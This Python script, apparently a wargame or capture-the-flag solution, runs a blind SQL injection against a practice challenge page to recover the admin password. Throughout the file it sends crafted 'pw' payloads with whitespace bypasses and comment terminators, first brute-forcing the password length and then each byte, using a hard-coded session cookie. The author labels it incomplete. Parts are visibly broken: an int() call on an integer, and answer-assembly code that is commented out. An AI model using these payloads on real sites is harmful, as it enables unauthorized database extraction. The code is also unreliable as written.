#-*-coding:utf-8-*-

import requests

length = 0

url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php"
PHPSESSID = 'mcefm2ia5bi0fjvk1ripeheht0'

'''
1234%27%0bor%0bid=%27admin%27%0band%0bhex(MID(pw,1,1))>0x11;%0b--%0b
'''

START_OF_PAYLOAD = "?pw=1234%27%0bor%0bid=%27admin%27%0band%0bhex(MID(pw,"
MIDDLE_OF_PAYLOAD = ",1))="
END_OF_PAYLOAD = ";%0b--%0b"

true_result = '<h2>Hello admin</h2>'

byteArr = []
answer = ''

cookie = {'PHPSESSID':PHPSESSID}

for x in range(1, 100):
    param = "?pw=' or id='admin' and LENGTH(hex(pw))=" + str(x) + "%23"
    new_url = url + param
    response = requests.get(new_url, cookies=cookie)

    if response.text.find(true_result) > -1:
        length = x + 1
        print("pw의 길이는 "+str(length-1))
        break


for idx in range(1, length):
    for hex_data in range(256):
        param = START_OF_PAYLOAD + str(idx) + MIDDLE_OF_PAYLOAD + format(hex_data, '#04x') + END_OF_PAYLOAD
        new_url = url + param
        print(new_url)
        response = requests.get(new_url, cookies=cookie)

        if response.text.find(true_result) > -1:
            byteArr.append(hex_data)
            print(str(idx) + "번째 문자 : "+int(hex_data, 16))
            break

'''
print("정답은 : " + answer)

response = requests.get(url+"?pw="+answer, cookies=cookie)

print(response.text)

# Blind SQL Injection using UNICODE
# 유니코드를 이용한 blind sql injection 공격

# Incomplete exploit code
# 미완성
'''